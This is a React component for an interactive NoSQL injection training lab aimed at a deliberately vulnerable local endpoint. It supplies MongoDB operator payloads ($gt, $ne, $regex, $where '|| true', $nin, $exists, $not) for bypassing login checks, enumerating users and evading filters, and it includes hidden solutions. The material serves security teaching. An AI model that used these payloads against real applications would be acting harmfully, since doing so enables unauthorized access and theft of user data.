import { useState, useRef, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from '@/components/ui/collapsible';
import { Zap, Shield, ChevronDown, Database, AlertTriangle, CheckCircle, Code, Terminal } from 'lucide-react';

interface NoSQLResult {
  success?: boolean;
  authenticated?: boolean;
  user?: {
    id?: number;
    username: string;
    email?: string;
    role?: string;
  };
  users?: Array<{
    id?: number;
    username: string;
    email?: string;
    role?: string;
  }>;
  error?: string;
  message?: string;
  flag?: string;
  injection_detected?: boolean;
  query_executed?: string;
}

export default function NoSqlInjectionLab() {
  const [activeTab, setActiveTab] = useState('intro');
  const [isHardMode, setIsHardMode] = useState(false);
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<NoSQLResult | null>(null);
  const [solutionStates, setSolutionStates] = useState<Record<string, boolean>>({
    gt: false,
    regex: false,
    where: false,
    bypass: false
  });
  const resultsRef = useRef<HTMLDivElement>(null);

  const [usernameInput, setUsernameInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');

  const toggleSolution = (technique: string) => {
    setSolutionStates(prev => ({ ...prev, [technique]: !prev[technique] }));
  };

  useEffect(() => {
    if (result && resultsRef.current) {
      resultsRef.current.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
  }, [result]);

  const executeQuery = async (payload: Record<string, any>) => {
    setLoading(true);
    setResult(null);

    try {
      const response = await fetch('/api/vuln/nosql-injection', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...payload,
          ...(isHardMode ? { mode: 'hard' } : {})
        }),
      });
      const data = await response.json();
      setResult(data);
    } catch (error) {
      setResult({ error: 'Network error - could not connect to server' });
    } finally {
      setLoading(false);
    }
  };

  const renderResults = () => {
    if (!result) return null;

    if (result.error) {
      return (
        <div ref={resultsRef} className="mt-4 p-4 bg-red-950/50 border border-red-500/50 rounded-lg">
          <div className="flex items-center gap-2 text-red-400 font-semibold mb-2">
            <AlertTriangle size={18} />
            Injection Failed
          </div>
          <p className="text-red-300 text-sm">{result.error}</p>
        </div>
      );
    }

    const hasInjection = result.injection_detected || result.authenticated;

    return (
      <div ref={resultsRef} className="mt-4 space-y-3">
        {result.flag && (
          <div className="p-4 bg-green-950/50 border border-green-500/50 rounded-lg">
            <div className="flex items-center gap-2 text-green-400 font-semibold mb-2">
              <CheckCircle size={18} />
              NoSQL Injection Successful!
            </div>
            <code className="text-green-300 bg-green-900/30 px-2 py-1 rounded">{result.flag}</code>
          </div>
        )}

        {hasInjection && (
          <div className="p-4 bg-[#B14EFF]/20 rounded-lg border border-[#B14EFF]/30">
            <div className="flex items-center gap-2 text-[#B14EFF] font-semibold mb-2">
              <Database size={18} />
              {result.authenticated ? 'Authentication Bypassed!' : 'NoSQL Injection Detected!'}
            </div>
            {result.message && (
              <p className="text-purple-300 text-sm">{result.message}</p>
            )}
          </div>
        )}

        {result.query_executed && (
          <div className="p-4 bg-slate-900/50 border border-slate-600/50 rounded-lg">
            <h4 className="text-[#B14EFF] font-semibold text-sm mb-2 flex items-center gap-2">
              <Terminal size={14} />
              Executed Query
            </h4>
            <pre className="text-xs text-slate-300 bg-slate-800/50 p-2 rounded overflow-x-auto">
              {result.query_executed}
            </pre>
          </div>
        )}

        {result.user && (
          <div className="p-4 bg-slate-900/50 border border-slate-600/50 rounded-lg">
            <h4 className="text-[#B14EFF] font-semibold text-sm mb-3 flex items-center gap-2">
              <Database size={14} />
              User Data Retrieved
            </h4>
            <div className="space-y-2 text-sm">
              {result.user.id && (
                <div className="flex items-center gap-2">
                  <span className="text-slate-500 w-24">ID:</span>
                  <span className="text-white font-mono">{result.user.id}</span>
                </div>
              )}
              <div className="flex items-center gap-2">
                <span className="text-slate-500 w-24">Username:</span>
                <span className="text-white">{result.user.username}</span>
              </div>
              {result.user.email && (
                <div className="flex items-center gap-2">
                  <span className="text-slate-500 w-24">Email:</span>
                  <span className="text-white">{result.user.email}</span>
                </div>
              )}
              {result.user.role && (
                <div className="flex items-center gap-2">
                  <span className="text-slate-500 w-24">Role:</span>
                  <Badge variant="outline" className={result.user.role === 'admin' ? 'border-yellow-500 text-yellow-400' : 'border-[#B14EFF] text-[#B14EFF]'}>
                    {result.user.role}
                  </Badge>
                </div>
              )}
            </div>
          </div>
        )}

        {result.users && result.users.length > 0 && (
          <div className="p-4 bg-slate-900/50 border border-slate-600/50 rounded-lg">
            <h4 className="text-[#B14EFF] font-semibold text-sm mb-3 flex items-center gap-2">
              <Database size={14} />
              Multiple Users Retrieved ({result.users.length})
            </h4>
            <div className="space-y-3 max-h-60 overflow-y-auto">
              {result.users.map((user, index) => (
                <div key={index} className="p-2 bg-slate-800/50 rounded border border-slate-700/50">
                  <div className="flex items-center gap-3 text-sm">
                    <span className="text-[#B14EFF] font-mono">#{user.id || index + 1}</span>
                    <span className="text-white">{user.username}</span>
                    {user.email && <span className="text-slate-400">{user.email}</span>}
                    {user.role && (
                      <Badge variant="outline" className="text-xs border-[#B14EFF]/50 text-[#B14EFF]">
                        {user.role}
                      </Badge>
                    )}
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {!result.flag && !hasInjection && !result.user && !result.users && result.success === false && (
          <div className="p-4 bg-yellow-950/30 border border-yellow-600/30 rounded-lg">
            <div className="flex items-center gap-2 text-yellow-400 font-semibold mb-2">
              <AlertTriangle size={18} />
              Authentication Failed
            </div>
            <p className="text-yellow-300 text-sm">{result.message || 'Invalid credentials - try a different payload'}</p>
          </div>
        )}
      </div>
    );
  };

  return (
    <div className="cyber-card border border-[#B14EFF]/30 mb-6 bg-gradient-to-br from-[#B14EFF]/10 to-[#0A0A14]">
      <div className="bg-gradient-to-r from-[#B14EFF]/20 to-[#0D0D14] border-b border-[#B14EFF]/30 px-6 py-5">
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-xl font-bold flex items-center">
              <span className="text-[#B14EFF]">NoSQL Injection Lab</span>
              <Badge className="ml-3 bg-[#B14EFF]/20 text-[#B14EFF] border-[#B14EFF]/30">MongoDB</Badge>
            </h2>
            <p className="text-gray-400 mt-1 text-sm">
              Exploit MongoDB operators to bypass authentication and extract data
            </p>
          </div>
          <div className="flex gap-2">
            <Button
              size="sm"
              variant={!isHardMode ? "default" : "outline"}
              className={!isHardMode ? "bg-[#B14EFF] hover:bg-[#B14EFF]/80" : "border-[#B14EFF]/50 text-[#B14EFF]"}
              onClick={() => setIsHardMode(false)}
            >
              <Zap size={16} className="mr-1" />
              Easy
            </Button>
            <Button
              size="sm"
              variant={isHardMode ? "default" : "outline"}
              className={isHardMode ? "bg-purple-900 hover:bg-purple-800" : "border-purple-800/50 text-[#B14EFF]"}
              onClick={() => setIsHardMode(true)}
            >
              <Shield size={16} className="mr-1" />
              Hard
            </Button>
          </div>
        </div>
        {isHardMode && (
          <div className="mt-3 p-2 bg-purple-900/30 border border-[#B14EFF]/30 rounded text-xs text-purple-300">
            Enhanced Security - Basic operators are filtered. Try alternate injection techniques!
          </div>
        )}
      </div>

      <div className="p-6">
        <Tabs value={activeTab} onValueChange={setActiveTab}>
          <TabsList className="grid grid-cols-5 bg-slate-900/50">
            <TabsTrigger value="intro" className="text-xs">Mission</TabsTrigger>
            <TabsTrigger value="gt" className="text-xs">$gt Operator</TabsTrigger>
            <TabsTrigger value="regex" className="text-xs">$regex Bypass</TabsTrigger>
            <TabsTrigger value="where" className="text-xs">$where Injection</TabsTrigger>
            <TabsTrigger value="bypass" className="text-xs">Bypass</TabsTrigger>
          </TabsList>

          <TabsContent value="intro" className="mt-4">
            <Card className="bg-slate-900/50 border-[#B14EFF]/30">
              <CardHeader>
                <CardTitle className="text-[#B14EFF] flex items-center gap-2">
                  <Database size={20} />
                  Mission Briefing
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4 text-sm">
                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <h4 className="font-semibold text-white mb-2">Scenario</h4>
                  <p className="text-slate-300">
                    You've discovered a login form that uses <strong className="text-[#B14EFF]">MongoDB</strong> as its 
                    backend database. The application may be vulnerable to NoSQL injection through MongoDB operators.
                    Your goal is to bypass authentication and extract user data.
                  </p>
                </div>

                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <h4 className="font-semibold text-white mb-2">Your Objectives</h4>
                  <ol className="list-decimal list-inside space-y-2 text-slate-300">
                    <li><strong>$gt Operator:</strong> Use comparison operators to bypass password checks</li>
                    <li><strong>$regex Bypass:</strong> Exploit regex patterns to match any password</li>
                    <li><strong>$where Injection:</strong> Execute JavaScript code in MongoDB queries</li>
                    <li><strong>Bypass:</strong> Evade security filters using alternate techniques</li>
                  </ol>
                </div>

                <div className="p-4 bg-purple-900/20 rounded-lg border border-[#B14EFF]/30">
                  <h4 className="font-semibold text-[#B14EFF] mb-2">How NoSQL Injection Works</h4>
                  <p className="text-slate-300 text-xs">
                    MongoDB uses JSON-like query operators. When user input is directly embedded in queries without 
                    sanitization, attackers can inject operators like <code className="bg-slate-700 px-1 rounded">$gt</code>, 
                    <code className="bg-slate-700 px-1 rounded">$ne</code>, <code className="bg-slate-700 px-1 rounded">$regex</code> 
                    to manipulate query logic. For example, <code className="bg-slate-700 px-1 rounded">{`{"$gt": ""}`}</code> 
                    as a password always evaluates to true.
                  </p>
                </div>

                <Button
                  className="w-full bg-[#B14EFF] hover:bg-[#B14EFF]/80"
                  onClick={() => setActiveTab('gt')}
                >
                  Start Lab - $gt Operator
                </Button>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="gt" className="mt-4">
            <Card className="bg-slate-900/50 border-[#B14EFF]/30">
              <CardHeader>
                <CardTitle className="text-orange-400 flex items-center gap-2">
                  <Code size={20} />
                  $gt Operator Injection
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>The login uses MongoDB to verify username and password</li>
                    <li>Use the $gt (greater than) operator to bypass password validation</li>
                    <li>A query like <code className="bg-slate-700 px-1 rounded">{`password: {"$gt": ""}`}</code> matches any non-empty password</li>
                    <li>Similarly $ne (not equal) can bypass: <code className="bg-slate-700 px-1 rounded">{`{"$ne": ""}`}</code></li>
                  </ol>
                </div>

                <div className="space-y-3">
                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-slate-300">Username</label>
                      <input
                        type="text"
                        value={usernameInput}
                        onChange={(e) => setUsernameInput(e.target.value)}
                        placeholder="admin"
                        className="w-full px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm"
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-slate-300">Password Payload</label>
                      <input
                        type="text"
                        value={passwordInput}
                        onChange={(e) => setPasswordInput(e.target.value)}
                        placeholder='{"$gt": ""}'
                        className="w-full px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm"
                      />
                    </div>
                  </div>
                  <Button
                    onClick={() => {
                      let password: any = passwordInput;
                      try {
                        password = JSON.parse(passwordInput);
                      } catch {}
                      executeQuery({ username: usernameInput || 'admin', password });
                    }}
                    disabled={loading}
                    className="w-full bg-orange-600 hover:bg-orange-500"
                  >
                    {loading ? 'Injecting...' : 'Execute Injection'}
                  </Button>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => {
                    executeQuery({ username: 'admin', password: { "$gt": "" } });
                  }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    $gt: "" (bypass)
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => {
                    executeQuery({ username: 'admin', password: { "$ne": "" } });
                  }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    $ne: "" (not equal)
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => {
                    executeQuery({ username: { "$gt": "" }, password: { "$gt": "" } });
                  }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    Both $gt (all users)
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.gt} onOpenChange={() => toggleSolution('gt')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.gt ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.gt ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>Basic bypass:</strong></p>
                      <pre className="bg-slate-700/50 p-2 rounded text-xs overflow-x-auto">
{`username: "admin"
password: {"$gt": ""}`}</pre>
                      <p className="text-slate-300"><strong>Get all users:</strong></p>
                      <pre className="bg-slate-700/50 p-2 rounded text-xs overflow-x-auto">
{`username: {"$gt": ""}
password: {"$gt": ""}`}</pre>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="regex" className="mt-4">
            <Card className="bg-slate-900/50 border-[#B14EFF]/30">
              <CardHeader>
                <CardTitle className="text-blue-400 flex items-center gap-2">
                  <Code size={20} />
                  $regex Pattern Bypass
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>The $regex operator allows pattern matching in MongoDB</li>
                    <li>Use regex patterns to match any password value</li>
                    <li>Pattern <code className="bg-slate-700 px-1 rounded">.*</code> matches any string</li>
                    <li>Can also enumerate usernames with regex patterns</li>
                  </ol>
                </div>

                <div className="space-y-3">
                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-slate-300">Username</label>
                      <input
                        type="text"
                        value={usernameInput}
                        onChange={(e) => setUsernameInput(e.target.value)}
                        placeholder="admin"
                        className="w-full px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm"
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-slate-300">Password Regex</label>
                      <input
                        type="text"
                        value={passwordInput}
                        onChange={(e) => setPasswordInput(e.target.value)}
                        placeholder='{"$regex": ".*"}'
                        className="w-full px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm"
                      />
                    </div>
                  </div>
                  <Button
                    onClick={() => {
                      let password: any = passwordInput;
                      try {
                        password = JSON.parse(passwordInput);
                      } catch {}
                      executeQuery({ username: usernameInput || 'admin', password });
                    }}
                    disabled={loading}
                    className="w-full bg-blue-600 hover:bg-blue-500"
                  >
                    {loading ? 'Injecting...' : 'Execute Regex Injection'}
                  </Button>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => {
                    executeQuery({ username: 'admin', password: { "$regex": ".*" } });
                  }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    $regex: ".*"
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => {
                    executeQuery({ username: { "$regex": "^a" }, password: { "$regex": ".*" } });
                  }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    Users starting with 'a'
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => {
                    executeQuery({ username: { "$regex": "admin|root" }, password: { "$regex": ".*" } });
                  }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    admin|root pattern
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.regex} onOpenChange={() => toggleSolution('regex')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.regex ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.regex ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>Match any password:</strong></p>
                      <pre className="bg-slate-700/50 p-2 rounded text-xs overflow-x-auto">
{`password: {"$regex": ".*"}`}</pre>
                      <p className="text-slate-300"><strong>Enumerate usernames:</strong></p>
                      <pre className="bg-slate-700/50 p-2 rounded text-xs overflow-x-auto">
{`username: {"$regex": "^admin"}
password: {"$regex": ".*"}`}</pre>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="where" className="mt-4">
            <Card className="bg-slate-900/50 border-[#B14EFF]/30">
              <CardHeader>
                <CardTitle className="text-purple-400 flex items-center gap-2">
                  <Terminal size={20} />
                  $where JavaScript Injection
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>MongoDB's $where operator executes JavaScript expressions</li>
                    <li>This allows arbitrary code execution in the database context</li>
                    <li>Use expressions that always return true to bypass auth</li>
                    <li>Can also extract data using timing attacks or error-based methods</li>
                  </ol>
                </div>

                <div className="p-3 bg-red-950/30 border border-red-600/30 rounded text-xs text-red-300">
                  <strong>⚠️ Warning:</strong> $where injection is extremely dangerous in production.
                  It allows full JavaScript execution within the MongoDB context.
                </div>

                <div className="space-y-3">
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-slate-300">$where JavaScript Expression</label>
                    <input
                      type="text"
                      value={usernameInput}
                      onChange={(e) => setUsernameInput(e.target.value)}
                      placeholder="this.username == 'admin' || true"
                      className="w-full px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm"
                    />
                  </div>
                  <Button
                    onClick={() => {
                      executeQuery({ $where: usernameInput || "this.username == 'admin' || true" });
                    }}
                    disabled={loading}
                    className="w-full bg-purple-600 hover:bg-purple-500"
                  >
                    {loading ? 'Executing...' : 'Execute $where Injection'}
                  </Button>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => {
                    executeQuery({ $where: "this.username == 'admin' || true" });
                  }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    || true bypass
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => {
                    executeQuery({ $where: "1==1" });
                  }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    1==1 (always true)
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => {
                    executeQuery({ $where: "this.role == 'admin'" });
                  }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    Find admins
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.where} onOpenChange={() => toggleSolution('where')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.where ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.where ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>Always true condition:</strong></p>
                      <pre className="bg-slate-700/50 p-2 rounded text-xs overflow-x-auto">
{`$where: "1==1"`}</pre>
                      <p className="text-slate-300"><strong>Access admin with bypass:</strong></p>
                      <pre className="bg-slate-700/50 p-2 rounded text-xs overflow-x-auto">
{`$where: "this.username == 'admin' || true"`}</pre>
                      <p className="text-slate-300"><strong>Find privileged users:</strong></p>
                      <pre className="bg-slate-700/50 p-2 rounded text-xs overflow-x-auto">
{`$where: "this.role == 'admin'"`}</pre>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="bypass" className="mt-4">
            <Card className="bg-slate-900/50 border-[#B14EFF]/30">
              <CardHeader>
                <CardTitle className="text-green-400 flex items-center gap-2">
                  <Shield size={20} />
                  Filter Bypass Techniques
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions (Enable Hard Mode!)</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>Switch to Hard Mode - basic operators may be filtered</li>
                    <li>Try alternate operator syntax and encoding</li>
                    <li>Use Unicode characters or nested operators</li>
                    <li>Combine multiple techniques for bypass</li>
                  </ol>
                </div>

                {!isHardMode && (
                  <div className="p-3 bg-yellow-950/30 border border-yellow-600/30 rounded text-xs text-yellow-300">
                    💡 Enable <strong>Hard Mode</strong> above to practice filter bypass techniques!
                  </div>
                )}

                <div className="space-y-3">
                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-slate-300">Username Payload</label>
                      <input
                        type="text"
                        value={usernameInput}
                        onChange={(e) => setUsernameInput(e.target.value)}
                        placeholder="admin"
                        className="w-full px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm"
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-slate-300">Password Payload</label>
                      <input
                        type="text"
                        value={passwordInput}
                        onChange={(e) => setPasswordInput(e.target.value)}
                        placeholder='{"$gt": ""}'
                        className="w-full px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm"
                      />
                    </div>
                  </div>
                  <Button
                    onClick={() => {
                      let username: any = usernameInput;
                      let password: any = passwordInput;
                      try { username = JSON.parse(usernameInput); } catch {}
                      try { password = JSON.parse(passwordInput); } catch {}
                      executeQuery({ username, password });
                    }}
                    disabled={loading}
                    className="w-full bg-green-600 hover:bg-green-500"
                  >
                    {loading ? 'Attempting Bypass...' : 'Execute Bypass'}
                  </Button>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => {
                    executeQuery({ username: { "$nin": [""] }, password: { "$nin": [""] } });
                  }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    $nin operator
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => {
                    executeQuery({ username: { "$exists": true }, password: { "$exists": true } });
                  }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    $exists: true
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => {
                    executeQuery({ username: "admin", password: { "$not": { "$eq": "" } } });
                  }} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    $not + $eq
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.bypass} onOpenChange={() => toggleSolution('bypass')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.bypass ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.bypass ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>Alternate operators:</strong></p>
                      <pre className="bg-slate-700/50 p-2 rounded text-xs overflow-x-auto">
{`password: {"$nin": [""]}  // Not in empty array
password: {"$exists": true}  // Field exists`}</pre>
                      <p className="text-slate-300"><strong>Nested operators:</strong></p>
                      <pre className="bg-slate-700/50 p-2 rounded text-xs overflow-x-auto">
{`password: {"$not": {"$eq": ""}}`}</pre>
                      <p className="text-slate-300"><strong>Array-based:</strong></p>
                      <pre className="bg-slate-700/50 p-2 rounded text-xs overflow-x-auto">
{`username: {"$in": ["admin", "root"]}
password: {"$gt": ""}`}</pre>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}
